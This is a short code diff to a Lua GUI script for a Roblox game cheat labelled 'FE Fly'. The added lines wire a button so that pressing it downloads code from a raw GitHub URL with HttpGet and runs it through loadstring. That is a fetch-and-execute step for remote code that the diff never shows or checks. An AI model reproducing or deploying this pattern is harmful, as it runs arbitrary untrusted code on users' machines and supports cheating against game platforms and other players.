@@ -61,6 +61,9 @@ script1.Font = Enum.Font.SourceSans
 script1.Text = "FE Fly"
 script1.TextColor3 = Color3.fromRGB(0, 0, 0)
 script1.TextSize = 14.000
+script2.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet"https://raw.githubusercontent.com/CheeseyMine/sdaaaaaaaaaaaa/main/sdaaaa")()
+end)
 
 script2.Name = "script2"
 script2.Parent = main
